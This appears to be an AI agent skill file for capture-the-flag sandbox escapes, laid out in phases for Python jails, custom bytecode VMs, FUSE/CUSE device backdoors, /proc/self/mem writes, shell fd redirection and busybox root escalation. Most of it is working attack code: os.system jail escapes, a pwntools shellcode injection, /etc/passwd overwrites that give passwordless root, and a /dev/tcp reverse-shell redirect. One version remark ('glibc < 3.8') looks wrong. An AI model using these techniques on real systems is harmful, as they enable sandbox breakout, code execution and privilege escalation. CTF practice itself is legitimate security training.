---
name: pwn-sandbox
description: "CTF sandbox escape. Python jail escape, custom bytecode VM exploitation, FUSE/CUSE character device exploitation, busybox restricted shell, /proc/self/mem write-anywhere, shell fd redirection tricks. Triggers: 'sandbox escape', 'python jail', 'vm exploitation', 'fuse exploit', 'cuse exploit', 'proc self mem', 'shell fd redirect', 'restricted environment escape', 'ctf sandbox'."
---

# CTF Pwn: Sandbox & Restricted Environment Escape

Python jail, VM exploitation, FUSE/CUSE, /proc/self/mem write-anywhere.

---

## Phase 1: Python Sandbox (pyjails)

See also: `ctf-misc-pyjails` skill for comprehensive Python jail techniques.

```python
# Class hierarchy navigation:
().__class__.__base__.__subclasses__()  # all subclasses of object

# Common exploit chain (glibc < 3.8):
().__class__.__base__.__subclasses__()[59].__init__.__globals__['sys'].modules['os'].system('id')

# When __class__ blocked: use type():
type(()).__bases__[0].__subclasses__()

# When only # $ \ allowed (HashCashSlash):
# Double-quoted eval: "\$$#" → $0 = bash
\$$#
```

---

## Phase 2: Custom Bytecode VM

```bash
# Pattern: CTF challenge implements custom VM with registers + opcodes + syscalls

# Identify VM structure:
# 1. Find opcode dispatch (switch statement or jump table)
# 2. List available syscalls
# 3. Find vulnerabilities:
#    - OOB read/write in struct access
#    - Type confusion
#    - Struct overflow via name/data fields

# Typical vulnerability pattern (TerViMator):
# - inspect(obj, offset) → OOB read beyond allocated buffer
# - write_byte(obj, offset, val) → OOB write
# - name(obj, length) → writes to struct, can overflow into adjacent struct
```

```python
from pwn import *

# Exploit VM OOB write to leak + overwrite function pointer:

# 1. Allocate two objects:
# create_object(data="A"*16)
# create_object(exec_type)

# 2. Use OOB inspect to read exec object's XOR-encoded function pointer:
# inspect(obj_data, offset=0x40)  # past end of obj_data buffer

# 3. XOR-decode to get PIE address → PIE base
PIE_BASE = leaked_ptr ^ KEY

# 4. Use name overflow on data object to reach exec object:
# name(obj_data, length=OVERFLOW_AMOUNT) + b"\x00" * PAD + p64(win_addr ^ KEY)

# 5. Call execute(exec_obj) → runs patched function
```

---

## Phase 3: FUSE/CUSE Character Device

```bash
# Identify FUSE/CUSE devices:
ls /dev/ | grep -v "^std\|^null\|^zero\|^urandom\|^random\|^full\|^tty\|^mem\|^loop"

# Check device operations:
strings ./challenge | grep -iE "write|read|open|b4ckd00r|command"

# Common backdoor pattern:
# write "command:file:arg" → triggers privileged action

# Example: chmod backdoor
echo "b4ckd00r:/etc/passwd:511" > /dev/backdoor
# 511 = 0o777 = rwxrwxrwx

# After making /etc/passwd writable:
echo "root: 0:0:root:/root:/bin/sh" > /etc/passwd
su root   # no password needed

# Find correct command format:
strings ./challenge | grep -A2 -B2 "strcmp\|strncmp"
```

---

## Phase 4: /proc/self/mem Write-Anywhere

```python
# /proc/self/mem provides raw process VA write, bypassing page protections
# Even read-only mapped code can be overwritten

from pwn import *

def write_mem(r, addr: int, data: bytes, filename_func, offset_func):
    """Write to /proc/self/mem via service API."""
    filename_func(r, b'/proc/self/mem')
    offset_func(r, addr)
    r.send(data)

# 1. Get shellcode:
shellcode = asm(shellcraft.sh())

# 2. Find writable+executable target address (if any), or:
# Write shellcode to a code region (works even if mapped r-x):
TARGET_CODE_ADDR = 0x401234  # e.g., after a function returns

# 3. Overwrite return address to shellcode:
# First overwrite the code at return addr with shellcode,
# then overwrite stack return address to point there

r = remote('target', 1337)
write_mem(r, TARGET_CODE_ADDR, shellcode, filename_func, offset_func)
r.interactive()
```

---

## Phase 5: Shell FD Redirection

```bash
# Network server: client connection often on fd 3
# Redirect stdin/stdout to fd 3 without netcat:

# Check open fds:
ls -la /proc/self/fd

# Shell redirect to network socket (fd 3):
exec <&3
sh >&3 2>&3

# Minimal form (important when char limit):
exec<&3;sh>&3
sh<&3 >&3
$0<&3 >&3     # $0 = current shell

# If fd 3 is bidirectional socket:
exec 3<>/dev/tcp/HOST/PORT
sh <&3 >&3 2>&3

# Busybox restricted shell: find writable targets:
find / -writable -type f 2>/dev/null | grep -v "/proc\|/sys"
# Write to /etc/passwd or /etc/sudoers via chmod'd file
```

---

## Phase 6: Restricted Shell Escalation (Busybox)

```bash
# Standard busybox restricted env:

# 1. Find character device backdoor (see Phase 3)
# 2. Chmod /etc/passwd via device
echo "b4ckd00r:/etc/passwd:511" > /dev/DEVICE_NAME

# 3. Add passwordless root:
echo "root: 0:0:root:/root:/bin/sh" > /etc/passwd

# 4. Switch to root:
su root

# Alternative: find SUID binaries:
find / -perm -4000 2>/dev/null
# If busybox is SUID: /bin/busybox sh -p

# Alternative: capabilities:
/sbin/getcap -r / 2>/dev/null
```

---

## Output

Save to `.omop/engagement/ctf/pwn/`:
- `exploit.py`: working sandbox escape
- `flag.txt`: captured flag

## Next Phase

→ `ctf-pwn-kernel` for kernel-level sandbox escape
→ `ctf-misc-pyjails` for Python jail specialized techniques
